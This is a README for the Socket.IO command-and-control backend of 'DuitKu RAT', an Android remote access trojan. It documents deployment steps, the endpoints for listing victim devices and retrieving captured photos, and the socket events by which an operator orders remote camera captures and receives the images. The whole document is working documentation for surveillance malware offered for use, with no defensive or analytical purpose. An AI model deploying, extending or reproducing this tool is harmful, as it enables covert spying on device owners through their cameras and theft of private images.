# DuitKu RAT - Socket.IO Backend

Backend server untuk DuitKu RAT menggunakan Socket.IO realtime.

## Features

- ✅ Realtime communication via WebSocket
- ✅ Device registration & monitoring
- ✅ Remote camera capture commands
- ✅ Photo upload & storage
- ✅ Multiple dashboard support
- ✅ RESTful API endpoints

## Deployment

### Railway.app

1. Push ke GitHub
2. Connect repository di Railway
3. Deploy otomatis
4. Copy deployment URL

### Manual (VPS)

```bash
npm install
npm start
```

Server berjalan di port 3000 (atau PORT environment variable).

## API Endpoints

### Health Check
```
GET /
Response: { status, devices, dashboards, photos, uptime }
```

### Get Devices
```
GET /api/devices
Response: [{ deviceId, deviceName, manufacturer, model, ... }]
```

### Get Photos
```
GET /api/photos?deviceId=xxx
Response: [{ photoId, deviceId, timestamp, base64Data }]
```

## Socket.IO Events

### Client (Device) Events

**Register:**
```javascript
socket.emit('register_device', {
  deviceId, deviceName, manufacturer, 
  model, androidVersion, battery
});
```

**Photo Upload:**
```javascript
socket.emit('photo_upload', {
  deviceId, base64Data
});
```

**Status Update:**
```javascript
socket.emit('status_update', {
  battery, isOnline
});
```

**Listen Commands:**
```javascript
socket.on('command', (data) => {
  // data.type = 'capture_photo'
});
```

### Dashboard Events

**Register:**
```javascript
socket.emit('register_dashboard');
```

**Capture Photo:**
```javascript
socket.emit('capture_photo', { deviceId });
```

**Listen Updates:**
```javascript
socket.on('device_list', (devices) => {});
socket.on('photo_received', (photo) => {});
```

## Environment Variables

```
PORT=3000
NODE_ENV=production
```

## Tech Stack

- Node.js
- Express
- Socket.IO
- CORS

## Notes

- Photos stored in memory (production: use database)
- No authentication (add JWT for production)
- CORS set to '*' (restrict for production)
